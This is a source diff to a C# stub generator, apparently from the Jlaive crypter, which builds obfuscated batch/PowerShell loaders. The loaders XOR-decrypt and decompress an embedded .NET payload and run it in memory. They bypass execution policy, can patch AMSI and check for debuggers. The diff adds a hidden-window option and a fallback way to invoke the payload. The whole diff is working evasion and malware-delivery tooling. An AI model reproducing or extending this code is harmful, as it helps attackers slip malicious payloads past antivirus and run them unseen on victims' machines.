@@ -7,7 +7,7 @@ namespace Jlaive
 {
     public class StubGen
     {
-        public static string CreatePS(string xorkey, Random rng)
+        public static string CreatePS(string xorkey, bool hidden, Random rng)
         {
             string varname = RandomString(6, rng);
             string varname2 = RandomString(6, rng);
@@ -16,7 +16,7 @@ namespace Jlaive
             string functionname = RandomString(6, rng);
             string functionname2 = RandomString(6, rng);
             string srcclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text;using System.IO;using System.IO.Compression; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]); } return input; } public static byte[] " + functionname2 + @"(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }"));
-            return $"pshell.exe -noprofile -executionpolicy bypass -command ${varname} = (Get-Content -path '%~f0').Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), '{xorkey}'))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
+            return $"pshell.exe -noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ${varname} = (Get-Content -path '%~f0').Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), '{xorkey}'))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
         }
 
         public static string CreateCS(byte[] pbytes, bool bamsi, bool antidebug, Random rng)
@@ -79,7 +79,9 @@ if (Debugger.IsAttached || isDebuggerPresent) Environment.Exit(1);" : string.Emp
             Marshal.Copy(patch, 0, asbaddr, patch.Length);
             VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);" : string.Empty) + @"
 
-            Assembly.Load(" + uncompressfunction + @"(" + xorfunction + @"(Convert.FromBase64String(payload), """ + key + @"""))).EntryPoint.Invoke(null, new object[] { args[0].Split(' ') });
+            MethodInfo entry = Assembly.Load(" + uncompressfunction + @"(" + xorfunction + @"(Convert.FromBase64String(payload), """ + key + @"""))).EntryPoint;
+            try { entry.Invoke(null, new object[] { args[0].Split(' ') }); }
+            catch { entry.Invoke(null, null); }
         }
 
         static byte[] " + xorfunction + @"(byte[] input, string key)
